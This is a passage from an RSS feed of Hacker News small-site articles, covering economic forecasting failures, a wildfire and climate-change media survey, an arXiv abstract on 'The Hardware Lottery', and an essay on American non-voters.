turned into an international emergency.</p><p>From its New York epicentre,&nbsp;the effects rippled around the world. International trade fell off a cliff. So did industrial production. Unemployment soared and consumer confidence collapsed.</p><p>7 months&nbsp;later, on 22 April 2009, the IMF&nbsp;published its&nbsp;<a href="https://www.imf.org/en/Publications/WEO/Issues/2016/12/31/World-Economic-Outlook-April-2009-Crisis-and-Recovery-22575"><span>World Economic Outlook</span></a>:</p><blockquote><p>‚ÄúEven with determined steps to return the financial sector to health and continued use of macroeconomic policy levers to support aggregate demand, global activity is projected to contract by 1.3% in 2009. (‚Ä¶) Growth is projected to reemerge in 2010, but at 1.9% it would be sluggish relative to past recoveries.‚Äù</p></blockquote><p>These figures did not fare well.</p><p>Global GDP did contract in 2009 but by 0.7%, around half as severe as the forecast. In 2010, growth wasn‚Äôt sluggish but soaring. The global economy grew by a whopping 5.1%, two and a half times greater than the 1.9% predicted.&nbsp;</p><p>In an analysis of the IMF predictions by&nbsp;<a href="https://www.brookings.edu/blog/future-development/2020/04/14/the-world-economy-in-2020-the-imf-gets-it-mostly-right/"><span>The Brookings Institute</span></a>, the critique went even further:</p><blockquote><p>‚Äú(The IMF) got the numbers for China and India wrong. The numbers for 2010 were way off-target: The U.S. economy ended up growing by 3% instead of the forecasted zero, Germany‚Äôs economy by 3.5% instead of shrinking by one and Japan by 4% instead of -0.5%.‚Äù</p></blockquote><p>But it isn‚Äôt just the IMF. Take The World Bank.</p><p>On 1 January 2010, The&nbsp;World Bank published their&nbsp;<a href="http://documents.worldbank.org/curated/en/115101468337160604/Global-economic-prospects-2010-crisis-finance-and-growth"><span>Global Economic Prospects</span></a>&nbsp;report. With 9 months longer than the IMF, you‚Äôd expect their GDP predictions to be much more accurate. But they still missed the mark.</p><p>They predicted global GDP to grow 2.7% but in reality it increased 3.8%. 1.1% out. In China and&nbsp;India, they&nbsp;were 1.3% out. And in Japan they were 2.7% wide of the mark.</p><p>Clearly our GDP predictions are imprecise and imperfect. But that doesn‚Äôt stop us from making more. As society starts to stabilise, economists turn their attention to predicting more universal measures. But how do they fare?&nbsp;</p><p>That‚Äôs the field that we‚Äôll focus on next.</p><h3>We can‚Äôt predict interest rates</h3><p>On&nbsp;14 July 2015, two&nbsp;economics professors,&nbsp;Maurice Obstfeld and Linda Tesar, published an article on the&nbsp;<a href="https://obamawhitehouse.archives.gov/blog/2015/07/14/decline-long-term-interest-rates"><span>White House website</span></a>&nbsp;espousing the importance of interest rates:</p><blockquote><p>‚ÄúThe level of long-term interest rates is of central importance in the macroeconomy. It matters to borrowers looking to start a business or buy a home; lenders evaluating the risk and rewards of extending credit; savers preparing for college or retirement; and policymakers crafting the government‚Äôs budget.‚Äù</p></blockquote><p>With interest rates being so important to so many, it‚Äôs no surprise that an entire industry of professional predictors exists to monitor the rate‚Äôs past and forecast its future.</p><p><a href="https://www.wsj.com/articles/some-investors-had-hunch-yields-were-about-to-fall-11560072600"><span>The Wall Street Journal</span></a>&nbsp;surveyed a panel of 50 such specialists and asked them to predict the interest rate 8 months into the future.</p><p>From a starting interest rate of 3.2%, the professional&nbsp;predictions ranged from a high of 3.8% to a low of 2.5%. The average estimate was 3.4%.</p><p>In reality, nobody came close. 6 months in and the interest rate had fallen below the predictions‚Äô lower bound. And it kept falling. By the end of the prediction timeframe the rate was closing in on 2%. None of the predictions had come within half a percent of reality.&nbsp;</p><p>These may seem like fine margins, but half a percent represents about a sixth of the initial rate. That‚Äôs like having 50 estate agents estimating the value of a $1.2m property and nobody coming within $200,000.</p><p>And this isn‚Äôt a one off.</p><p>The Obstfeld and Tesar article&nbsp;presents the results of similar studies conducted in&nbsp;five different years.</p><p>In every single one, the&nbsp;forecasts fail. In 2006, the rate was predicted to be 6%, in reality it was closer to 5%. In 2010, it was predicted to be 6%, it was actually closer to 4%. In 2005, it was predicted to be 5%, it was closer to 2%.</p><p>The article concludes:</p><blockquote><p>‚ÄúThe decline (in interest rates) has come largely as a surprise. Financial markets and professional forecasters alike consistently failed to predict the secular shift, focusing too much on cyclical factors.‚Äù</p></blockquote><p>It seems that interest rate predictions are prone to flounder and fold. But that doesn‚Äôt stop us from making more. Despite our failures at forecasting one economy, some turn their attention to predicting the relationship between two. But how do they fare?&nbsp;</p><p>That‚Äôs the field that we‚Äôll focus on next.</p><h3>We can‚Äôt predict exchange rates</h3><p>If predicting the ups and downs of one economy is hard, forecasting the relationship between two is doubly difficult.</p><p>Fortunately, financial institutions&nbsp;make an assessment of their success straight forward.</p><p>At the start of each year, many banks make a prediction for the end of year dollar-to-euro exchange-rate. In one study, Gerd Gigerenzer, the director emeritus of the Center for Adaptive Behavior and Cognition&nbsp;at the Max Planck Institute for Human Development, compiled the exchange rate predictions made between 2000 and 2010 by 22 international banks including Barclays, Citigroup, JPMorgan&nbsp;Chase, and the Bank of&nbsp;America Merrill Lynch.</p><p>Discussing the Gigerenzer study in his book&nbsp;<a href="https://www.amazon.co.uk/dp/1509843493/ref=cm_sw_r_cp_api_i_H6r5EbR6BYQMC"><span>Range</span></a>&nbsp;David Epstein provides some searing details into where the forecasts went wrong:</p><blockquote><p>‚ÄúIn six of the ten years, the true exchange rate fell outside the entire range of all twenty-two bank forecasts. (‚Ä¶) Major bank forecasts missed every single change of [exchange rate] direction in the decade Gigerenzer analysed.‚Äù</p></blockquote><p>Gigerenzer‚Äôs own conclusion was even more clear:</p><blockquote><p>‚ÄúForecasts of dollar-to-euro exchange rates are worthless.‚Äù</p></blockquote><p>30 years earlier, Richard Meese and Kenneth Rogoff, from the University of California, Berkeley and the Federal reserve respectively, pitted three different exchange rate ‚Ä¶</p></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy">https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy</a></em></p>]]>
            </description>
            <link>https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy</link>
            <guid isPermaLink="false">hacker-news-small-sites-24522322</guid>
            <pubDate>Fri, 18 Sep 2020 22:03:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is Climate Change Responsible for This Season's Wildfires?]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24521994">thread link</a>) | @amoorthy
<br/>
September 18, 2020 | https://blog.thefactual.com/climate-change-wildfires-oregon-california | <a href="https://web.archive.org/web/*/https://blog.thefactual.com/climate-change-wildfires-oregon-california">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_151456960811572" data-hs-cos-general-type="widget" data-hs-cos-type="module">
    <div>
<div>
<div>
<div>


<div>
<div>


<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>The recent HBO miniseries <em>Chernobyl</em> captured a key moment in which human protagonists are confronted by the scale of a disaster. During this unprecedented man-made incident in 1986, nuclear scientists at a damaged nuclear reactor struggled to assess the danger from radiation, especially because the geiger counters on hand ‚Äî devices meant to measure levels of radiation ‚Äî <a href="https://www.jstor.org/stable/10.5612/slavicreview.74.1.104?read-now=1&amp;seq=9#page_scan_tab_contents" rel="noopener" target="_blank"><span>didn‚Äôt go high enough</span></a> to measure the amount of radiation leaking into the environment. The radiation essentially exceeded what the scientists had tools on hand to measure.</p>
<!--more-->
<p>This week, the fires across the West Coast highlighted our own inability to comprehend the scale of a disaster scenario, with air quality in parts of Oregon <a href="https://www.oregonlive.com/news/2020/09/portlands-air-quality-is-off-the-charts-on-sunday-and-much-of-oregon-is-just-as-bad-due-to-wildfires.html" rel="noopener" target="_blank"><span>exceeding</span></a> the Environmental Protection Agency‚Äôs 500-point AQI scale. Previously, events that put the AQI at 300 were ‚Äúextremely rare‚Äù; in recent days, the AQI in places like Eugene, Oregon topped 700, essentially <a href="https://grist.org/climate/oregons-air-quality-is-so-far-beyond-hazardous-that-no-one-knows-what-it-means-for-health/" rel="noopener" target="_blank"><span>unfamiliar territory</span></a> in terms of air quality.&nbsp;</p>
<p>Though not quite the same as a nuclear meltdown, we are similarly unprepared to answer key questions about the crisis: What are the <a href="https://www.vox.com/21427857/california-wildfire-2020-oregon-washington-air-quality-smoke-orange-red-sky-health" rel="noopener" target="_blank"><span>health impacts</span></a> of exposure to this air? What are the long-term effects of fires in forest land that <a href="https://www.nytimes.com/2020/09/12/climate/oregon-wildfires.html?action=click&amp;module=Spotlight&amp;pgtype=Homepage" rel="noopener" target="_blank"><span>shouldn‚Äôt typically burn</span></a>? And above all, to what degree is human activity, via climate change or other mechanisms, responsible for such natural disasters?&nbsp;</p>
<p>This week, The Factual surveyed 29 articles from 23 news sources across the political spectrum to see how the media is talking about the West Coast‚Äôs mega-fire season, including views on how and to what degree human activity is responsible for seemingly apocalyptic scenarios.</p>
<h4><br><strong>A Wild Wildfire Season</strong></h4>
<p>Given the <a href="https://www.theguardian.com/us-news/2020/sep/12/california-oregon-washington-fires-explained-climate-change" rel="noopener" target="_blank"><span>unprecedented scope</span></a> of this year‚Äôs wildfires on the West Coast, a common question is why this wildfire season has been quite so bad. A cursory glance at headlines and comments by national figures would lead one to believe that there is a simple dichotomy, with the political left blaming climate change and the right blaming bad government policies. In reality, there seems to be some broad agreement on the key factors at play: (1) a problematic approach to forest management that has led to greater fire risks, (2) human behavior that makes fires more dangerous and more likely, and (3) a warming climate. Only when measuring to what degree changing climate is responsible, and the fundamental reasons for why climate is changing, does real disagreement emerge.</p>
<p>A big misconception about fires is that they are inherently dangerous and/or bad for the environment, but the reality is that they are an <a href="https://www.theguardian.com/us-news/2020/sep/12/california-oregon-washington-fires-explained-climate-change" rel="noopener" target="_blank"><span>essential part</span></a> of ecosystem renewal and healthy environmental progression. In a natural scenario, many forest habitats should burn on a regular basis, clearing the underbrush while leaving larger trees mostly unharmed. But a longtime misdirected approach to fire management on the West Coast has prioritized <a href="https://www.wired.com/story/climate-grief-is-burning-across-the-american-west/" rel="noopener" target="_blank"><span>putting out</span></a> fires quickly to protect growing human populations. However, this strategy has not been accompanied by enough controlled burns to limit growing fire risks and maintain normal ecosystem renewal.</p>
<p><span>"Part of the difficulty is that California‚Äôs climate provides only limited periods of time when crews can safely light fires to manage forest health. The conditions must be dry enough for vegetation to burn, but not dry enough to risk a runaway blaze." - <a href="https://www.sfchronicle.com/california-wildfires/article/Are-climate-change-or-poor-forest-management-15564031.php" rel="noopener" target="_blank">San Francisco Chronicle</a></span></p>
<p>While the safety rationale of the choice not to burn seems straightforward, it can perversely have the opposite effect. If an ecosystem does not burn, the underbrush continues to build up, making the next eventual fire <a href="https://www.nationalreview.com/2020/09/california-forest-mismanagement-a-disaster/#slide-1" rel="noopener" target="_blank"><span>hotter and more dangerous</span></a>. As the fire intensity increases, trees that shouldn‚Äôt burn go up in flames and smaller, low-intensity fires become fast-moving disasters that endanger natural ecosystems and human settlements alike. In this way, man-made policies have helped make the West Coast a tinderbox.</p>
<div><p>Further aggravating this risk is human behavior. As populations and urban areas grow, humans have expanded ever-outward, encroaching on and living in heavily-forested areas. This has increasingly placed populations in danger from wildfires. Forest management has been consistently <a href="https://www.nytimes.com/2020/09/10/climate/wildfires-climate-policy.html" rel="noopener" target="_blank"><span>under-resourced</span></a>, and landowners aren't always <a href="https://arstechnica.com/science/2020/01/why-isnt-california-using-more-prescribed-burns-to-reduce-fire-risk/" rel="noopener" target="_blank"><span>willing</span></a> to respond with the measures needed to mitigate fire risks. In California, for example, the state only owns <a href="https://www.kqed.org/science/1927354/controlled-burns-can-help-solve-californias-fire-problem-so-why-arent-there-more-of-them" rel="noopener" target="_blank">57% of forested land</a> and cannot obligate private landowners to use controlled burns to mitigate fire risks.</p></div>
<p><img src="https://lh5.googleusercontent.com/zxd_ypEby-bddzFmqsD5-961ZgOYuNCl08ZrzIsbA-JrHcczJEKfI32SXmpV7vj56YKlrEHixxzC0uvbbswH1LTdWmNQwimnRzsJOJ4hfe7DfOa_yc3LKRD03j6u1e1lJRmuA4_-" width="578"></p>
<div><p>The WUI, or wildland-urban interface, is the area where human settlement and wildlands intermix. These are areas were human structures are in close proximity to land prone to wildfires. Source: <a href="https://www.nrs.fs.fed.us/news/release/wui-increase" rel="noopener" target="_blank"><span>USDA</span></a></p></div>
<p>Factors such as lower housing costs and a desire to be closer to nature have <a href="https://www.nytimes.com/2020/09/10/climate/wildfires-climate-policy.html" rel="noopener" target="_blank"><span>helped encourage</span></a> the development subdivisions and individual homes well into the forest. To make matters worse, as these populations (and people from across the states) spend more time outdoors and in these forests, the risk of fire goes up. The ever-increasing levels of human activity is accompanied by an ever-higher risk of fire.</p>
<div><p>Finally, the overall climatic conditions cannot be ignored. 2020 promises to be one of the <a href="https://www.discovermagazine.com/environment/with-august-in-the-books-2020-is-still-likely-to-be-the-warmest-year-on" rel="noopener" target="_blank"><span>hottest years on record</span></a>, and this year‚Äôs fire season vigorously kicked off on a record-hot Labor Day weekend, partly because of a freak lightning storm in California (with over <a href="https://abcnews.go.com/ABCNews/million-acres-burned-california-firefighters-brace-lightning-storm/story?id=72551511" rel="noopener" target="_blank"><span>12,000 lightning strikes</span></a>) and partly because landscapes across the West Coast were uncharacteristically dry ‚Äî even for fire season.&nbsp;</p></div>
<p><img src="https://lh6.googleusercontent.com/Sfqjx4sJ4aGT8ibajU93V7ZjH8HOQ8P0Th_NDP77MSdgLymRRRWv-8soEftHsKo7mmpODdIl2yHjPlGWaUWNnJLEop01ql63y_hzOWOwMZdCfJn6OW9a7tuveBEi7ECcAhyd0xhz" width="600"></p>
<div><p>This map shows how average temperatures in August 2020 contrast with the average August temperatures from 1951-1980.&nbsp; Source: <a href="https://www.discovermagazine.com/environment/with-august-in-the-books-2020-is-still-likely-to-be-the-warmest-year-on" rel="noopener" target="_blank"><span>Discover Magazine</span></a></p></div>
<p>It would seem that disputes about whether the world is warming have been replaced with a general agreement that, yes, things are getting hotter. This has obvious, straightforward effects for natural events like wildfires. Higher temperatures mean drier vegetation and potentially even more high-intensity <a href="https://www.oregonlive.com/news/2020/09/oregons-historic-wildfires-the-unprecedented-was-predictable.html" rel="noopener" target="_blank"><span>wind events</span></a>. That this is at least part of the reason for this fire season‚Äôs severity is clear to people on both sides of the spectrum.</p>
<p>Where these perspectives diverge is in terms of just who or what is responsible for changing climate. Though President Trump has used the occasion to <a href="https://www.washingtonexaminer.com/policy/energy/trump-says-world-will-start-getting-cooler-as-biden-criticizes-him-as-a-climate-arsonist" rel="noopener" target="_blank"><span>cast doubt</span></a> on the question of whether climate is changing ‚Äî something almost all of the articles reviewed for this analysis roundly agree to be the case ‚Äî the more pertinent divergence regards the degree to which human activity is responsible for the changing climate.&nbsp;</p>
<p>Articles from the political left and center are clear in the science and rationale for linking human activity, particularly the release of greenhouse gas emissions, with climate change ‚Äî a phenomenon that represents a combination of not just overall warmer temperatures but also increasing weather extremes, rising sea levels, and shifting climatic patterns. In the case of wildfires, this means some articles lay proportionally more blame on <a href="https://www.latimes.com/california/story/2020-09-13/climate-change-wildfires-california-west-coast" rel="noopener" target="_blank"><span>larger climate trends</span></a>, blaming global <a href="https://www.wired.com/story/climate-grief-is-burning-across-the-american-west/" rel="noopener" target="_blank"><span>CO2 emissions</span></a> as much as localized factors like forestry management.&nbsp;</p>
<p>‚ÄúMany of the phenomena happening now have been predicted for years by agencies like NASA, NOAA and the United Nations, as well as researchers and scientists around the world, who say the only chance of slowing climate change is cutting back or eliminating the biggest producers of greenhouse gases, including cars.‚Äù - <a href="https://weather.com/news/climate/news/2020-09-11-extreme-weather-climate-change-disasters-wildfires-flooding-hurricanes" rel="noopener" target="_blank"><span>The Weather Channel</span></a></p>
<p>Many on the political right are still hesitant to conclude that human activity is the driving force behind a changing climate, even if many acknowledge that the climate is <a href="https://www.foxnews.com/politics/wildfire-democrats-climate-change" rel="noopener" target="_blank"><span>getting warmer</span></a>. As a result, much more right-leaning coverage focuses on the direct, <a href="https://reason.com/2020/09/14/western-wildfires-can-be-prevented-if-burdens-on-forest-management-are-eased/" rel="noopener" target="_blank"><span>human reasons</span></a> for the current spate of fire disasters, and <a href="https://today.yougov.com/topics/science/articles-reports/2020/09/15/what-americans-think-about-wildfires-and-climate-c" rel="noopener" target="_blank"><span>roughly half</span></a> of Republicans may think that climate change has not played a role in the current fires.&nbsp;</p>
<p>Ideally, we could better isolate each variable to say how much human movement into forests is responsible for fires and how much is due to a warmer climate, but this is hard to parse from overall trends. For example, across the U.S. we built as many as <a href="https://www.mdpi.com/2571-6255/3/3/50/htm" rel="noopener" target="_blank"><span>32 million homes</span></a> between 1990 and 2015 in the wildland-urban interface ‚Äî areas where the wildlands intermix with human development ‚Äî many of which are at increased fire risk. At the same time, fires near Portland are burning forest that has historically been too wet to pose a significant hazard to long-standing neighborhoods.&nbsp;</p>
<p>‚ÄúWhat‚Äôs different this time is that exceptionally dry conditions, combined with unusually strong and hot east winds, have caused wildfires to spiral out of control, threatening neighborhoods that didn‚Äôt seem vulnerable until now.‚Äù - <a href="https://www.nytimes.com/2020/09/12/climate/oregon-wildfires.html?action=click&amp;module=Spotlight&amp;pgtype=Homepage" rel="noopener" target="_blank"><span>New York Times</span></a></p>
<div><p>A positive perspective on the issue might note that both sides, despite clear and vocal differences, actually agree that human activity and behavior make up many of the key reasons for these apocalyptic conditions.</p></div>
<h4><strong>Moving Forward</strong></h4>
<p>As <a href="https://www.chicagotribune.com/weather/ct-weather-smoke-fires-gray-sky-20200914-kpmxe2i2gjhahocfpd7zwovqt4-story.html" rel="noopener" target="_blank"><span>smoke wafts</span></a> across the U.S., there may be greater impetus to drive higher-level reform to address these growing issues. There are many reforms that both sides can agree on. Above all, we need to <a href="https://www.nytimes.com/2020/09/10/climate/wildfires-climate-policy.html" rel="noopener" target="_blank"><span>modify land management practices</span></a> and divert more resources to both fire response and prevention. For example, as the risk of fire has increased, funding that should be used for fire prevention has been shifted to firefighting. Cumbersome regulatory hurdles have slowed the implementation of controlled burns, and private landowners <a href="https://www.foxnews.com/politics/wildfire-democrats-climate-change" rel="noopener" target="_blank"><span>can still reject</span></a> such preventative action, often fearful of <a href="http://sacbee.com/news/california/article239475468.html" rel="noopener" target="_blank"><span>liability</span></a>. Measures like <a href="https://slate.com/business/2018/11/california-houses-rebuild-camp-fire-design.html" rel="noopener" target="_blank"><span>increasingly fire-proof</span></a> homes can help, but only go so far.</p>
<p>‚ÄúForest Service spending on fire suppression in recent years has gone from 15 percent of the budget to 55 percent ‚Äì or maybe even more ‚Äì which means we have to keep borrowing from funds that are intended for forest management.‚Äù - <a href="https://www.usda.gov/media/press-releases/2017/09/14/forest-service-wildland-fire-suppression-costs-exceed-2-billion" rel="noopener" target="_blank"><span>Secretary of Agriculture Sonny Purdue</span></a></p>
<p>Below this common ground, larger disagreements promise to persist, especially about climate change and its role in the current conflagrations. A host of policy actions that the political left targets, such as reducing ‚Ä¶</p></span></p></div></div></div></div></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.thefactual.com/climate-change-wildfires-oregon-california">https://blog.thefactual.com/climate-change-wildfires-oregon-california</a></em></p>]]>
            </description>
            <link>https://blog.thefactual.com/climate-change-wildfires-oregon-california</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521994</guid>
            <pubDate>Fri, 18 Sep 2020 21:21:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Hardware Lottery]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24521983">thread link</a>) | @bnjemian
<br/>
September 18, 2020 | Https://arxiv.org/abs/2009.06489 | <a href="https://web.archive.org/web/*/Https://arxiv.org/abs/2009.06489">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      
      <div id="content">
        <!--
rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
         xmlns:dc="http://purl.org/dc/elements/1.1/"
         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
    <rdf:Description
        rdf:about="/abs/2009.06489"
        dc:identifier="/abs/2009.06489"
        dc:title="The Hardware Lottery"
        trackback:ping="/trackback/2009.06489" />
    </rdf:RDF>
-->
<div id="abs-outer">
  

  <div>
    

    <p><strong>arXiv:2009.06489</strong> (cs)
    </p>
    



<div id="content-inner">
  <div id="abs">
    <p>
  
  
  
    
  
  
    
    
  

  [Submitted on 14 Sep 2020]</p>
    
    
      
    
  
    <p><a href="https://arxiv.org/pdf/2009.06489">Download PDF</a></p><blockquote>
      <span>Abstract:</span>  Hardware, systems and algorithms research communities have historically had
different incentive structures and fluctuating motivation to engage with each
other explicitly. This historical treatment is odd given that hardware and
software have frequently determined which research ideas succeed (and fail).
This essay introduces the term hardware lottery to describe when a research
idea wins because it is suited to the available software and hardware and not
because the idea is superior to alternative research directions. Examples from
early computer science history illustrate how hardware lotteries can delay
research progress by casting successful ideas as failures. These lessons are
particularly salient given the advent of domain specialized hardware which
makes it increasingly costly to stray off of the beaten path of research ideas.

    </blockquote>

    <!--CONTEXT-->
    <div>
      <table summary="Additional metadata"><tbody><tr>
          <td>Subjects:</td>
          <td>
            <span>Computers and Society (cs.CY)</span>; Artificial Intelligence (cs.AI); Hardware Architecture (cs.AR); Machine Learning (cs.LG)</td>
        </tr><tr>
          <td>Cite as:</td>
          <td><span><a href="https://arxiv.org/abs/2009.06489">arXiv:2009.06489</a> [cs.CY]</span></td>
        </tr>
        <tr>
          <td>&nbsp;</td>
          <td>(or <span>
              <a href="https://arxiv.org/abs/2009.06489v1">arXiv:2009.06489v1</a> [cs.CY]</span> for this version)
          </td>
        </tr>
      </tbody></table>
    </div>
  </div>
</div>

    <div>
      <h2>Submission history</h2><p> From: Sara Hooker [<a href="https://arxiv.org/show-email/37378193/2009.06489">view email</a>]
      <br><strong>[v1]</strong>
Mon, 14 Sep 2020 14:49:10 UTC (4,498 KB)<br></p></div>
  </div>
  <!--end leftcolumn-->

  <div>
    
    <!--end full-text-->
    <div><p>
    Current browse context: </p><p>cs.CY</p>

  
  
    </div>

    

    
  </div>
  <!--end extra-services-->


  
  
  
  

  
</div>

      </div>
    </div></div>]]>
            </description>
            <link>Https://arxiv.org/abs/2009.06489</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521983</guid>
            <pubDate>Fri, 18 Sep 2020 21:20:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Non-Voter]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24521930">thread link</a>) | @exolymph
<br/>
September 18, 2020 | https://americancompass.org/the-commons/the-non-voter/ | <a href="https://web.archive.org/web/*/https://americancompass.org/the-commons/the-non-voter/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><img data-src="https://americancompass.org/wp-content/uploads/2020/08/DSC_7299-scaled.jpg" src="https://americancompass.org/wp-content/uploads/2020/08/DSC_7299-scaled.jpg"></p><p>Like the largest political group in America, the non-voter, I completely ignored this year‚Äôs Democratic convention. Like an overwhelming majority of Americans I didn‚Äôt watch any speeches, didn‚Äôt go online to read hot takes spinning those speeches, and I didn‚Äôt fight on Twitter over whatever happened.</p><p>Instead I spent the week doing what I usually do, and what most people do, which is getting on with my life by working, talking to friends and family, watching sports, playing video games, whatever.</p><p>If I am going to continue to do this I will keep ignoring the silly details of the election and focus instead on keeping my head above water, and when election day comes, I will probably forget about it, or if I remember it, will simply shrug and say, ‚ÄúToo busy. Doesn‚Äôt matter anyways.‚Äù</p><p>For many Americans, as they see it, politics, especially presidential politics, doesn‚Äôt matter. It‚Äôs a far removed thing that every few years makes a lot of noise, pestering them with ads and phone calls, and when over, forgets about them or screws them over. It is like that flower they see on TV that attracts big crowds because it blooms every seven years and smells of rotting flesh.</p><p><span id="more-1981"></span>Each election there are three choices and the winner is always not voting. In 2016 100 million people chose this option, far far more than people who voted for Trump. Or Clinton. ‚ÄúNone of the above‚Äù effectively wins every presidential election, and it isn‚Äôt even close.</p><p>That is a pretty damning indictment of our political system and suggest understanding non-voters is more important than a Joe Biden speech watched by less than 10% of adults, and far more important than what a bunch of DC insiders think of it.</p><p>Most of my book on poverty and addiction is about non-voters. That isn‚Äôt surprising since the poorest Americans are the least likely to vote. Yet I met plenty of working class and solidly middle class people who don‚Äôt vote.</p><p>One reason people don‚Äôt vote is because it is unnecessarily hard to do, and that should be changed. But it is far more than that. For many Americans, as they see it, not voting is the right choice, and they still wouldn‚Äôt vote if it was easier to do.</p><p>The attitude is best summed up by T, a forty-year old black man in Lumberton, North Carolina who explained why he didn‚Äôt vote in 2016,</p><p>‚ÄúI am just so upset with the whole thing. Fed up. I voted for Obama. Seems like when he left office nothing changed for me. Nothing changed for this neighborhood. So I say, ‚ÄòWe had a black president and I still working for eight dollars per hour and nothing has changed. Nothing. Ain‚Äôt nothing changed. Every single president. Obama. Bush. Clinton. Same thing.‚Äù</p><p>Or J, 62, in Battle Creek, Michigan,</p><p>‚ÄúMost of the men I know didn‚Äôt vote. Nobody had the spirit this time. Trump or Hillary? Doesn‚Äôt make much difference. Things out here gonna stay the same. We had high hopes for Obama. But nothing changed. Blacks here didn‚Äôt end up being helped by him. I mean, he might have tried, but his hands were tied by both parties. Lots of us are just so frustrated. Nobody had the spirit.‚Äù</p><p>No change and still no hope, so why bother.</p><p>T and J at least took the time to respond. Most others, when asked about politics, simply roll their eyes, or laugh, or shake their head, or spit out something like, ‚ÄòFuck them crooks.‚Äô</p><p>This isn‚Äôt a left or right thing, or a black or white thing, or an urban versus rural thing. It isn‚Äôt just an Obama thing, like in the two examples. I heard the same frustration and same disappointment directed at Bush and Romney from deep red regions, like trailer parks in West Virginia and truck stops in Kansas, just like I heard it directed at Obama and Clinton in deep blue regions like a housing project in downtown Cleveland and the wards of El Paso.</p><p><img src="https://americancompass.org/wp-content/uploads/2020/08/DSC_8937-300x200.jpg" alt="" width="741" height="494" srcset="https://americancompass.org/wp-content/uploads/2020/08/DSC_8937-300x200.jpg 300w, https://americancompass.org/wp-content/uploads/2020/08/DSC_8937-1024x683.jpg 1024w, https://americancompass.org/wp-content/uploads/2020/08/DSC_8937-768x513.jpg 768w, https://americancompass.org/wp-content/uploads/2020/08/DSC_8937-1536x1025.jpg 1536w" sizes="(max-width: 741px) 100vw, 741px"></p><p>Not voting is about a justified cynicism forged from a lifetime of being screwed over by the status quo, and little is more status quo than sporting a ‚ÄúI voted‚Äù sticker. In their minds, and from their experiences, voting has no clear upside. Nothing is going to change.</p><p>And it comes with downside, both explicit and implicit.</p><p>Voting means entering institutions that have given them problems. From schools, where they were tested, measured, and prodded endlessly, only to be then ignored, scolded, or demeaned. To municipal buildings where they were taxed, fined, or charged.</p><p>Voting means interacting with a class of people who filled and embodied those institutions. Who either ignored or scolded them in school, or taxed and fined them in the court house. It is rejoining a part of America that doesn‚Äôt value them, from the way they dress to the way they think.</p><p>Voting means getting further entangled with a bureaucracy that has done nothing but tangled them up. Hell, it might even come with jury duty. They can‚Äôt do that because they are working two jobs and got kids to care for.</p><p>All to pull a lever, to be one single vote out of 122 million? Hell. ‚ÄòNo way my vote is going make one bit of difference with that many people voting. So you want me to have to drive into town when I got only enough gas to get to work and don‚Äôt want to have to fill up tomorrow because I am on a tight schedule and need to switch to my back up card because I misplaced the first charge card. All for a vote that won‚Äôt change a thing. Even if, miracle of miracles, my vote swung the election. Now what? I got the president I wanted, and nothing has changed. My street still has potholes and my job still sucks.‚Äô</p><p><img src="https://americancompass.org/wp-content/uploads/2020/08/DSC_3728-2-2-1-300x211.jpg" alt="" width="738" height="519" srcset="https://americancompass.org/wp-content/uploads/2020/08/DSC_3728-2-2-1-300x211.jpg 300w, https://americancompass.org/wp-content/uploads/2020/08/DSC_3728-2-2-1-1024x722.jpg 1024w, https://americancompass.org/wp-content/uploads/2020/08/DSC_3728-2-2-1-768x541.jpg 768w, https://americancompass.org/wp-content/uploads/2020/08/DSC_3728-2-2-1-1536x1083.jpg 1536w" sizes="(max-width: 738px) 100vw, 738px">That isn‚Äôt to say non-voters don‚Äôt have views about politics, or don‚Äôt have a side they root for, or won‚Äôt trash talk the president or a candidate. They have strong views, and they might get emotionally involved for a bit, but they know their place is to watch. They are spectators of a sport that doesn‚Äôt involve them, or care about them. The outcome won‚Äôt change their life because it never has.</p><p>They are the fans with no money on the line, only in it for possible bragging rights. That is different from the wealthy, successful, and highly educated. We all have money on the line, whether we acknowledge it or not. From the business community, lobbyists, non-profits, and think tanks, who explicitly have cash on the line, to the verified accounts fighting on Twitter whose job and status is tethered to the winner.</p><p>While we may not be players on the field, we are part of the team. Our life and careers will change, sometimes hugely, depending on who wins. Politics is our sport, our game. It is built by and for us.</p><p>For most Americans, like the twenty-five year old woman flipping hamburgers in Detroit, or the forty-five year old guy selling tires in Odessa, who wins isn‚Äôt going to change their lives, as they see it. Politics isn‚Äôt their sport, isn‚Äôt their game, isn‚Äôt built by or for them, as they reckon it. Rather, it is something they can watch for entertainment, but most have already seen this show before, and the ending is pretty whatever.</p> <p><a href="https://americancompass.org/the-commons/">Return to the Commons</a></p></div></div>]]>
            </description>
            <link>https://americancompass.org/the-commons/the-non-voter/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521930</guid>
            <pubDate>Fri, 18 Sep 2020 21:14:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Cryptologic Mystery]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24521801">thread link</a>) | @homarp
<br/>
